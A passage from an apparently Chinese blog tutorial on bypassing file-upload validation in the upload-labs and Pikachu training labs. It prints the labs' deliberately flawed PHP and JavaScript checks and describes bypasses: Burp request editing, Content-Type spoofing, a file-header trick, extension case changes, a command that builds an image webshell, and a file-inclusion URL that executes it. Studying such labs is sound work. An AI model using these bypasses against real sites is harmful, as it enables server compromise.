<span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upfile'</span><span class="token punctuation">]</span>是你表单上传的文件信息数组，upfile是文件上传字段，在上传时由服务器根据上传字段设定。

<span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upfile'</span><span class="token punctuation">]</span>包含了以下内容<span class="token punctuation">:</span>
<span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span> 客户端文件的原名称。
<span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'type'</span><span class="token punctuation">]</span> 文件的 <span class="token constant">MIME</span> 类型，需要浏览器提供该信息的支持，例如<span class="token double-quoted-string string">"image/gif"</span>。
<span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'size'</span><span class="token punctuation">]</span> 已上传文件的大小，单位为字节。
<span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span> 文件被上传后在服务端储存的临时文件名。
<span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upfile'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'error'</span><span class="token punctuation">]</span> 和该文件上传相关的错误代码。

</code></pre>
<ul><li>下面这段js代码定义了检查上传文件的函数</li></ul>
<pre><code class="prism language-php"><span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token double-quoted-string string">"text/javascript"</span><span class="token operator">&gt;</span>
    <span class="token keyword">function</span> <span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">var</span> file <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByName</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>
        <span class="token comment">//获取到文件名</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>file <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> file <span class="token operator">==</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token function">alert</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"请选择要上传的文件!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
       
        <span class="token keyword">var</span> allow_ext <span class="token operator">=</span> <span class="token double-quoted-string string">".jpg|.png|.gif"</span><span class="token punctuation">;</span>
         <span class="token comment">//定义允许上传的文件类型</span>
        
        <span class="token keyword">var</span> ext_name <span class="token operator">=</span> file<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"."</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//提取上传文件的类型。</span>
        <span class="token comment">//通过lastIndexOf取到“.”的索引，再使用substring函数截取 .后缀名</span>
       
        <span class="token keyword">if</span> <span class="token punctuation">(</span>allow_ext<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>ext_name<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token comment">//如果 allow_ext 中没有 ext_name字符串，则返回-1</span>
            <span class="token keyword">var</span> errMsg <span class="token operator">=</span> <span class="token double-quoted-string string">"该文件不允许上传，请上传"</span> <span class="token operator">+</span> allow_ext <span class="token operator">+</span> <span class="token double-quoted-string string">"类型的文件,当前文件类型为："</span> <span class="token operator">+</span> ext_name<span class="token punctuation">;</span>
            <span class="token function">alert</span><span class="token punctuation">(</span>errMsg<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
         <span class="token comment">//判断上传文件类型是否允许上传</span>
    <span class="token punctuation">}</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>

</code></pre>
<hr/>
<ul><li><strong>推荐两个关于JS的浏览器插件</strong></li><li>关于禁用JS的两个浏览器插件，<code>个人倾向性于第一个，我觉得可以选择禁用JS简单快捷高效</code>，第二个的话功能比较多一些，但是也会禁用掉正常页面的JS</li></ul>
<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210517225532936.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUxOTc4OQ==,size_16,color_FFFFFF,t_70"/></p>
<hr/>
<h5><a id="3111_JavaScript_344"></a>3.1.1.1 绕过客户端JavaScript验证的方法</h5>
<ul><li><strong>方法一：</strong> 修改JavaScript去修改其中关键的检测函数，或者直接通过插件禁用JavaScript。</li></ul>
<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210517230503655.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUxOTc4OQ==,size_16,color_FFFFFF,t_70"/></p>
<ul><li><strong>方法二：</strong> 直接发送请求包,通过Burp抓到正常上传的请求报文后，修改报文的内容，在直接通过Burp发送，便跳过了网页中JS的验证过程。</li></ul>
<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210517230652136.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUxOTc4OQ==,size_16,color_FFFFFF,t_70"/></p>
<ul><li>修改一句话木马文件，将文件格式改成允许上传的文件格式。</li><li>进行上传文件，使用BP拦截数据包。</li></ul>
<p><img alt="-" src="https://img-blog.csdnimg.cn/20210517230920169.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUxOTc4OQ==,size_16,color_FFFFFF,t_70"/></p>
<ul><li>将抓取到的数据包中的文件格式修改回<code>php</code>、再进行发送，从而实现文件上传</li></ul>
<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210517231030828.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUxOTc4OQ==,size_16,color_FFFFFF,t_70"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210517231210718.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUxOTc4OQ==,size_16,color_FFFFFF,t_70"/></p>
<ul><li>后续的验证操作，跟上面木马利用一样。</li><li>主要就是介绍了一下前端的验证，以及文件上传可以干个啥事。这一关希望大家记住一句话 <code>“所有前端的验证机制都是不安全的”</code>，因为前端的东西是用户可控制的。</li></ul>
<h3><a id="32_MIME_366"></a>3.2 服务端MIME类型验证</h3>
<ul><li>MIME类型是描述消息<code>内容类型的因特网标准。</code></li></ul>
<p><img alt="-" src="https://img-blog.csdnimg.cn/20210517232309395.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUxOTc4OQ==,size_16,color_FFFFFF,t_70"/></p>
<ul><li>利用Burp抓包，将报文中的Content-Type改成允许的类型</li><li>Content-Type: image/gif</li><li>Content-Type: image/jpg</li><li>Content-Type: image/png</li></ul>
<hr/>
<ul><li><code>打开upload-labs 靶场第二题 - JS检查</code></li><li><strong>源码分析</strong></li></ul>
<pre><code class="prism language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
<span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token single-quoted-string string">'image/jpeg'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token single-quoted-string string">'image/png'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'type'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token single-quoted-string string">'image/gif'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>          
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'上传出错！'</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'文件类型不正确，请重新上传！'</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

</code></pre>
<ul><li>可以看到，其实并没有什么特别之处，就是使用了<code>$_FILES['upload_file']['type'</code>]获取到<code>Content-Type字段</code>，并进行比较，如果是那三种类型就继续向下执行，否则进行提示。</li></ul>
<p><img alt="-" src="https://img-blog.csdnimg.cn/20210522215719921.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUxOTc4OQ==,size_16,color_FFFFFF,t_70"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210522234227501.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUxOTc4OQ==,size_16,color_FFFFFF,t_70"/></p>
<hr/>
<ul><li><code>可以尝试用pickchu靶场进行复现。</code></li><li><a href="https://blog.csdn.net/weixin_44519789/article/details/114969948">PikaChu_不安全的文件上传漏洞</a></li><li>这里的复现过程，我就不一一赘述了。感兴趣的大家可以访问上面的链接。<br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/2021052223501919.gif#pic_center"/></li></ul>
<h3><a id="33__416"></a>3.3 服务器文件内容验证-文件头</h3>
<ul><li>图片格式往往不是根据文件后缀名去做判断的。文件头是文件开头的一段二进制，不同的图片类型，文件头是不同的。文件头又称文件幻数。</li><li>常见文件幻数</li><li><code>JPG: FF D8 FF EO 00 10 4A 46 49 46.</code></li><li><code>GIF:47 49 46 3839 61(GIF89a).</code></li><li><code>PNG:89 50 4E 47</code></li></ul>
<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210518163051435.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUxOTc4OQ==,size_16,color_FFFFFF,t_70"/></p>
<h4><a id="331__424"></a>3.3.1 绕过服务器文件内容验证-文件头</h4>
<hr/>
<ul><li><code>打开upload-labs 靶场第十三题 - 图片马绕过</code></li><li><strong>源码分析</strong></li></ul>
<pre><code class="prism language-php"><span class="token keyword">function</span> <span class="token function">getReailFileType</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$bin</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//只读2字节</span>
    <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$strInfo</span> <span class="token operator">=</span> @<span class="token function">unpack</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"C2chars"</span><span class="token punctuation">,</span> <span class="token variable">$bin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    
    <span class="token variable">$typeCode</span> <span class="token operator">=</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$strInfo</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'chars1'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">$strInfo</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'chars2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    
    <span class="token variable">$fileType</span> <span class="token operator">=</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">;</span>    
    <span class="token keyword">switch</span><span class="token punctuation">(</span><span class="token variable">$typeCode</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>      
        <span class="token keyword">case</span> <span class="token number">255216</span><span class="token punctuation">:</span>            
            <span class="token variable">$fileType</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'jpg'</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token number">13780</span><span class="token punctuation">:</span>            
            <span class="token variable">$fileType</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'png'</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>        
        <span class="token keyword">case</span> <span class="token number">7173</span><span class="token punctuation">:</span>            
            <span class="token variable">$fileType</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'gif'</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token keyword">default</span><span class="token punctuation">:</span>            
            <span class="token variable">$fileType</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'unknown'</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>    
        <span class="token keyword">return</span> <span class="token variable">$fileType</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
<span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$file_type</span> <span class="token operator">=</span> <span class="token function">getReailFileType</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$file_type</span> <span class="token operator">==</span> <span class="token single-quoted-string string">'unknown'</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"文件未知，上传失败！"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"/"</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"YmdHis"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"."</span><span class="token punctuation">.</span><span class="token variable">$file_type</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
            <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"上传出错！"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>


</code></pre>
<ul><li> <p><strong>方法一：</strong> 伪造文件头绕过方法</p> </li><li> <p><strong>方法二：</strong> 利用服务器将木马文件解析成了图片文件，因此向其发送执行该文件的请求时，服务器只会返回这个“图片”文件，并不会执行相应命令。</p> </li><li> <p>利用 文件包含漏洞 可以将图片格式的文件当做php文件来解析执行:<code>http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/2021/03/20/9439796055e7a8d1a39396276569.jpg&amp;submit=提交查询</code></p> </li><li> <p>模板：<code>http://127.0.0.1/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/上传文件的回显路径&amp;submit=提交查询</code></p> </li></ul>
<p><img alt="**加粗样式**" src="https://img-blog.csdnimg.cn/20210320213316295.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUxOTc4OQ==,size_16,color_FFFFFF,t_70"/></p>
<h4><a id="332__482"></a>3.3.2 如何生成图片木马：</h4>
<blockquote>
<ol><li>在路径下准备好一句话木马.php和一张图片 .png (或者 .jpg )</li><li>输入系统指令： <code>copy 一张图片.png/b+一句话木马.php/a 生成图片名称.png</code></li><li>这样图片木马就合成好了</li></ol>
</blockquote>
<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210318191043363.png"/></p>
<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210318190727826.png"/></p>
<h3><a id="34__491"></a>3.4 服务器文件扩展名验证-黑名单</h3>
<ul><li><strong>服务器文件扩展名验证-黑名单的原理</strong></li></ul>
<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210518165837788.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUxOTc4OQ==,size_16,color_FFFFFF,t_70"/></p>
<ul><li><a href="https://blog.csdn.net/qq_32448559/article/details/81667309">环境准备：upload-labs 靶场的安装与配置教程</a></li></ul>
<p><img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/20210518174336929.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDUxOTc4OQ==,size_16,color_FFFFFF,t_70"/></p>
<h4><a id="341__499"></a>3.4.1 后缀名大小写绕过</h4>
<ul><li><strong>后缀名大小写绕过原理：</strong><code>服务端没有将后缀名转换为统一格式进行比对</code>，导致可以上传后缀为pHp的文件，又因为<code>Windows操作系统大小写不敏感</code>，所以.pHp扔回被当成PHP文件解析。</li></ul>
<pre><code class="prism language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
<span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">".php"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php5"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php4"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php3"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".php2"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".html"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".htm"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".phtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pht"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp5"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp4"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp3"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHp2"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".Html"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".Htm"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".pHtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jsp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jspa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jspx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jsw"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jsv"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jspf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSpx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSpa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSw"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSv"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jSpf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".jHtml"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aspx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asax"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".ascx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".ashx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".asmx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".cer"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSp"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSpx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSa"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSax"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aScx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aShx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".aSmx"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".cEr"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".sWf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".swf"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">".htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//删除文件名末尾的点</span>
        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//去除字符串::$DATA</span>
        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//首尾去空</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
